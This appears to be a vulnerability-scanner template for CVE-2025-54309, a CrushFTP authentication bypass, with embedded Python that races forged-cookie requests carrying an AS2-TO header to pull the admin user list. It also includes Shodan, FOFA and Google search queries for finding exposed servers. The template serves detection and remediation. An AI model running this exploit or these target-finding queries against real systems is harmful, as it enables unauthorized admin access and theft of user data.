code:
- engine:
  - py
  - python3
  matchers:
  - type: word
    words:
    - 'VULNERABLE:'
  source: "import requests\nimport threading\nimport time\nimport random\nimport string\n\
    import re\nimport os\n\ndef generate_random_c2f():\n    \"\"\"Generate random\
    \ 4-character c2f value\"\"\"\n    return ''.join(random.choices(string.ascii_letters\
    \ + string.digits, k=4))\n\ndef make_request_with_as2(target_url, c2f_value, cookie):\n\
    \    \"\"\"Make request with AS2-TO header and disposition-notification content\
    \ type\"\"\"\n    url = f\"{target_url}/WebInterface/function/\"\n\n    headers\
    \ = {\n        \"Host\": target_url.replace(\"http://\", \"\").replace(\"https://\"\
    , \"\"),\n        \"User-Agent\": \"python-requests/2.32.3\",\n        \"Accept-Encoding\"\
    : \"gzip, deflate\",\n        \"Accept\": \"*/*\",\n        \"Connection\": \"\
    keep-alive\",\n        \"AS2-TO\": \"\\\\crushadmin\",\n        \"Content-Type\"\
    : \"disposition-notification\",\n        \"X-Requested-With\": \"XMLHttpRequest\"\
    ,\n        \"Cookie\": cookie\n    }\n\n    data = {\n        \"command\": \"\
    getUserList\",\n        \"serverGroup\": \"MainUsers\",\n        \"c2f\": c2f_value\n\
    \    }\n\n    try:\n        response = requests.post(url, headers=headers, data=data,\
    \ verify=False, timeout=5)\n        return f\"AS2 Request - Status: {response.status_code}\"\
    , response.text\n    except Exception as e:\n        return f\"AS2 Request - Error:\
    \ {str(e)}\", \"\"\n\ndef make_request_without_as2(target_url, c2f_value, cookie):\n\
    \    \"\"\"Make request without AS2-TO header and disposition-notification content\
    \ type\"\"\"\n    url = f\"{target_url}/WebInterface/function/\"\n\n    headers\
    \ = {\n        \"Host\": target_url.replace(\"http://\", \"\").replace(\"https://\"\
    , \"\"),\n        \"User-Agent\": \"python-requests/2.32.3\",\n        \"Accept-Encoding\"\
    : \"gzip, deflate\",\n        \"Accept\": \"*/*\",\n        \"Connection\": \"\
    keep-alive\",\n        \"X-Requested-With\": \"XMLHttpRequest\",\n        \"Cookie\"\
    : cookie\n    }\n\n    data = {\n        \"command\": \"getUserList\",\n     \
    \   \"serverGroup\": \"MainUsers\",\n        \"c2f\": c2f_value\n    }\n\n   \
    \ try:\n        response = requests.post(url, headers=headers, data=data, verify=False,\
    \ timeout=5)\n        return f\"Regular Request - Status: {response.status_code}\"\
    , response.text\n    except Exception as e:\n        return f\"Regular Request\
    \ - Error: {str(e)}\", \"\"\n\ndef check_vulnerable_response(response_text):\n\
    \    \"\"\"Check if response contains user_list_subitem pattern and extract usernames\"\
    \"\"\n    if \"<user_list_subitem>\" in response_text:\n        usernames = re.findall(r'<user_list_subitem>(.*?)</user_list_subitem>',\
    \ response_text)\n        if usernames:\n            top_users = usernames[:10]\n\
    \            print(f\"[*] EXFILTRATED {len(top_users)} USERS: {', '.join(top_users)}\"\
    )\n            return True\n    return False\n\ndef race_requests_with_detection(target_url,\
    \ num_requests=100):\n    \"\"\"Race multiple requests and detect vulnerability\"\
    \"\"\n    print(f\"Starting race with {num_requests} request pairs...\")\n\n \
    \   for i in range(num_requests):\n        # Generate new c2f every 50 requests\n\
    \        if i % 50 == 0:\n            c2f_value = generate_random_c2f()\n    \
    \        cookie = f\"CrushAuth=1755657772315_Nr7FSH4jd2l6RueteEaaEDpY1CcdU{c2f_value};\
    \ currentAuth={c2f_value}\"\n            print(f\"[*] NEW SESSION: c2f={c2f_value}\"\
    )\n        else:\n            c2f_value = generate_random_c2f()\n            cookie\
    \ = f\"CrushAuth=1755657772315_Nr7FSH4jd2l6RueteEaaEDpY1CcdU{c2f_value}; currentAuth={c2f_value}\"\
    \n\n        # Store results\n        results = {'as2': None, 'regular': None}\n\
    \n        def as2_worker():\n            results['as2'] = make_request_with_as2(target_url,\
    \ c2f_value, cookie)\n\n        def regular_worker():\n            results['regular']\
    \ = make_request_without_as2(target_url, c2f_value, cookie)\n\n        # Create\
    \ and start threads\n        t1 = threading.Thread(target=as2_worker)\n      \
    \  t2 = threading.Thread(target=regular_worker)\n\n        # Start both threads\
    \ simultaneously\n        t1.start()\n        t2.start()\n\n        # Wait for\
    \ both to complete\n        t1.join()\n        t2.join()\n\n        # Check for\
    \ vulnerability in both responses\n        as2_status, as2_response = results['as2']\n\
    \        regular_status, regular_response = results['regular']\n\n        # Check\
    \ if either response contains the user list pattern\n        if check_vulnerable_response(as2_response)\
    \ or check_vulnerable_response(regular_response):\n            print(f\"VULNERABLE:\
    \ {target_url}\")\n            return True\n\n        # Print progress every 25\
    \ requests\n        if (i + 1) % 25 == 0:\n            print(f\"[*] PROGRESS:\
    \ {i + 1}/{num_requests} request pairs completed...\")\n\n    return False\n\n\
    if __name__ == \"__main__\":\n    host = os.getenv(\"Host\")\n    port = os.getenv(\"\
    Port\")\n\n    if not host:\n        print(\"Host environment variable not set\"\
    )\n        exit(1)\n\n    # Construct target URL\n    if not host.startswith(('http://',\
    \ 'https://')):\n        target_url = f\"http://{host}\"\n        if port and\
    \ port != \"80\":\n            target_url = f\"http://{host}:{port}\"\n    else:\n\
    \        target_url = host\n        if port and port != \"80\" and port not in\
    \ host:\n            target_url = f\"{host}:{port}\"\n\n    print(f\"[*] Testing\
    \ target: {target_url}\")\n\n    # Try 100 requests with race condition detection\n\
    \    if race_requests_with_detection(target_url, 100):\n        print(\"VULNERABLE:\
    \ Race condition vulnerability detected!\")\n    else:\n        print(\"Target\
    \ appears to be patched or timing window missed\")\n"
id: CVE-2025-54309
info:
  author: pussycat0x,watchTowr,dhiyaneshdk
  classification:
    cpe: cpe:2.3:a:crushftp:crushftp:*:*:*:*:*:*:*
    cve-id: CVE-2025-54309
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-287,CWE-362
    epss-percentile: 0.98261
    epss-score: 0.62076
  description: 'CrushFTP 10 before 10.8.5 and 11 before 11.3.4_23, when the DMZ proxy
    feature is not used, mishandles AS2 validation and consequently allows remote
    attackers to obtain admin access via HTTPS, as exploited in the wild in July 2025.

    '
  impact: 'Remote attackers can bypass authentication and access sensitive user data,
    potentially leading to unauthorized access to the CrushFTP system and exfiltration
    of user information.

    '
  metadata:
    fofa-query:
    - title="crushftp"
    - icon_hash="-1022206565"
    google-query: intitle:"crushftp"
    product: crushftp
    shodan-query:
    - http.title:"crushftp"
    - http.favicon.hash:-1022206565
    vendor: crushftp
    verified: true
    zoomeye-query: title:"crushftp"
  name: CrushFTP - Authentication Bypass Race Condition
  reference:
  - https://github.com/watchtowrlabs/watchTowr-vs-CrushFTP-Authentication-Bypass-CVE-2025-54309/blob/main/watchTowr-vs-CrushFTP-CVE-2025-54309.py
  - https://labs.watchtowr.com/the-one-where-we-just-steal-the-vulnerabilities-crushftp-cve-2025-54309/
  remediation: 'Update to the latest version of CrushFTP that patches this authentication
    bypass vulnerability.

    '
  severity: critical
  tags: cve,cve2025,crushftp,auth-bypass,race-condition,kev,vkev,vuln
variables:
  HOST: '{{Host}}'
  PORT: '{{Port}}'
